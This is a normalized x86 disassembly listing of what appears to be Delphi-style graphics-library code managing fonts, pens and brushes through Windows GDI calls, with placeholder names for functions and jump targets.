add [ eax ] al
inc eax
sub [ eax + 0x3 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sub [ eax + 0x3003 ] 0xa87db800
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add esi [ esp + ebp * 4 - 0x59 ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx eax
mov esp 0xc803a87f
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x3a ]
test al 0x3
mov esi es
test al 0x3
push cs
push esp
dec ebp
je r-xdata
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
sub [ eax + 0x2403 ] 0x0
imul esp [ ebx + 0x73 ] 0x8900000
sub [ eax + 0x3 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x80
test al 0x3
or [ eax ] al
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add ecx [ esp + edx * 2 ]
push ebx
push 0x64657261
dec ecx
sub_3a884e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8851c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a88558
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_3a884cc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_3a88540
xor edx edx
push ebp
push sub_3a8862c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a88633
mov eax [ ebp - 0x4 ]
call sub_3a8854c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_3a62ee0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_3a63154
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_3a69360
test al al
je r-xdata
sub_3a8863c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a88540
xor ecx ecx
push ebp
push sub_3a886c4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a8854c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_3a88700
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a88540
xor eax eax
push ebp
push sub_3a88769
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a88558
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a8863c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a88770
mov eax [ ebp - 0x4 ]
call sub_3a8854c
retn
mov eax ebx
mov si 0xfffd
call sub_3a6457c
sub_3a8877c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a88540
xor eax eax
push ebp
push sub_3a887d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a887df
mov eax [ ebp - 0x4 ]
call sub_3a8854c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_3a6457c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a8863c
sub_3a887f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a88540
xor eax eax
push ebp
push sub_3a88858
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8885f
mov eax [ ebp - 0x4 ]
call sub_3a8854c
retn
mov esi ebx
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push edi
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_3a88868
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_3a7a898
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a88905
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a7a494
mov ebx eax
mov eax ebx
call sub_3a89f78
inc [ ebp - 0x4 ]
mov eax ebx
call sub_3a8a364
mov eax [ rw-data ]
call sub_3a887f8
mov eax [ rw-data ]
call sub_3a887f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8890c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_3a7a494
call sub_3a8a234
inc esi
dec ebx
jne r-xdata
sub_3a88f5b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_3a79db4
retn
sub_3a88f8c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xc
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x4
movzx eax [ esp + 0x17 ]
mov [ ebx + 0xe ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_3a63e30
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xf ]
mov cl 0x1f
call sub_3a63934
movzx eax [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0xd ] 0x8
mov [ ebx + 0xc ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov eax [ esp + 0xc ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x0
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_3a8904c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_3a88558
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a890a0
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_3a8863c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a890e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a7aad0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a88d98
xor eax eax
push ebp
push sub_3a8919f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_3a88d98
xor eax eax
push ebp
push sub_3a89182
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a8877c
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3a89220
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a89189
mov eax [ ebp - 0x8 ]
call sub_3a88da8
retn
mov eax ebx
call sub_3a8956c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3a89588
sub_3a891d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a88d98
xor eax eax
push ebp
push sub_3a89215
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a88700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8921c
mov eax [ ebp - 0x4 ]
call sub_3a88da8
retn
sub_3a89234
push ebx
mov ebx eax
movzx eax [ ebx + 0xe ]
cmp al [ rw-data ]
jne r-xdata
xor eax eax
pop ebx
retn
mov eax rw-data
lea edx [ ebx + 0xf ]
movzx ecx [ eax ]
inc ecx
call sub_3a639d4
je r-xdata
mov al 0x1
pop ebx
retn
sub_3a89260
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a8947c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a89483
lea eax [ ebp - 0x50 ]
mov edx 0x4
call sub_3a652c4
retn
mov eax [ rw-data ]
call sub_3a88540
xor edx edx
push ebp
push sub_3a89454
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a8854c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
mov [ ebp - 0x29 ] al
cmp [ rw-data ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1e ]
cmp al 0x1
jne r-xdata
mov edi r-xdata
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
movzx eax [ rw-data ]
mov [ ebp - 0x29 ] al
jmp r-xdata
push edi
mov eax r-xdata
call sub_3a65730
push eax
push esi
lea eax [ ebp - 0x48 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_3a65504
mov eax [ ebp - 0x48 ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_3a65504
mov esi [ ebp - 0x44 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_3a65504
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0x24 ]
call sub_3a6a1e0
lea eax [ ebp - 0x4c ]
mov edx rw-data
call sub_3a65504
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_3a6a1e0
jmp r-xdata
mov [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call sub_3a90234
cmp al 0x80
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x28 ] 0x7
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x10
call sub_3a89234
test al al
je r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_3a895ec
dec al
je r-xdata
mov [ ebp - 0x29 ] 0x80
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_3a8949c
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_3a88f8c
mov edx esp
mov eax ebx
call sub_3a891d0
add esp 0x30
pop esi
pop ebx
retn
sub_3a894c8
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a894c0
cmp esi eax
je r-xdata
add esp 0x30
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_3a891b8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_3a891d0
sub_3a89510
push ebx
push esi
add esp 0xfffffed0
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x130
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_3a891b8
lea eax [ esp + 0xf ]
xor ecx ecx
mov edx 0x20
call sub_3a63a44
lea eax [ esp + 0x30 ]
mov edx esi
mov ecx 0xff
call sub_3a6553c
lea edx [ esp + 0x30 ]
lea eax [ esp + 0xf ]
mov cl 0x1f
call sub_3a63934
mov edx esp
mov eax ebx
call sub_3a891d0
sub_3a89588
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_3a894c8
pop esi
pop ebx
retn
sub_3a895b4
push ebx
add esp 0xffffffcc
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_3a895a8
cmp al [ esp ]
je r-xdata
add esp 0x34
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_3a891b8
movzx eax [ esp ]
mov [ esp + 0x11 ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_3a891d0
sub_3a895f4
push ebx
push esi
add esp 0xffffffd0
mov ebx edx
mov esi eax
mov eax esi
call sub_3a895ec
cmp bl al
je r-xdata
add esp 0x30
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_3a891b8
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_3a891d0
sub_3a8962c
push ebx
push esi
add esp 0xffffffd0
mov ebx edx
mov esi eax
mov eax esi
call sub_3a89624
cmp bl al
je r-xdata
add esp 0x30
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_3a891b8
mov [ esp + 0xe ] bl
mov edx esp
mov eax esi
call sub_3a891d0
sub_3a89664
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a8965c
cmp esi eax
je r-xdata
add esp 0x30
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_3a891b8
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_3a891d0
sub_3a89694
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_3a88558
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a896d8
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_3a8863c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a89700
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a7aad0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a88d98
xor eax eax
push ebp
push sub_3a897a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_3a88d98
xor eax eax
push ebp
push sub_3a89783
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a8877c
movzx edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3a898f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8978a
mov eax [ ebp - 0x8 ]
call sub_3a88da8
retn
sub_3a897b8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_3a897d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a88d98
xor eax eax
push ebp
push sub_3a89815
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a88700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8981c
mov eax [ ebp - 0x4 ]
call sub_3a88da8
retn
sub_3a89828
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a89820
cmp esi eax
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_3a897b8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_3a897d0
sub_3a89858
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_3a88540
xor eax eax
push ebp
push sub_3a898de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a8854c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_3a88d54
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_3a8990c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov eax esi
call sub_3a89904
cmp bl al
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_3a897b8
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_3a897d0
sub_3a89944
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
call sub_3a8993c
cmp esi eax
je r-xdata
mov edx esp
mov eax ebx
call sub_3a897b8
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_3a897d0
sub_3a89978
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_3a88558
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a899b8
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_3a8863c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a899e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a7aad0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a88d98
xor eax eax
push ebp
push sub_3a89a70
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_3a88d98
xor eax eax
push ebp
push sub_3a89a53
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a8877c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a89a5a
mov eax [ ebp - 0x8 ]
call sub_3a88da8
retn
sub_3a89a88
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_3a89aa4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a88d98
xor eax eax
push ebp
push sub_3a89ae9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a88700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a89af0
mov eax [ ebp - 0x4 ]
call sub_3a88da8
retn
sub_3a89af4
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_3a89aa4
add esp 0x10
pop edi
pop esi
retn
sub_3a89b20
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a89b18
cmp esi eax
jne r-xdata
mov edx esp
mov eax ebx
call sub_3a89a88
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov eax ebx
call sub_3a89c54
cmp al 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_3a89aa4
mov [ esp + 0xc ] 0x0
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
call sub_3a89c54
test al al
je r-xdata
sub_3a89b74
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_3a88540
xor edx edx
push ebp
push sub_3a89c42
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
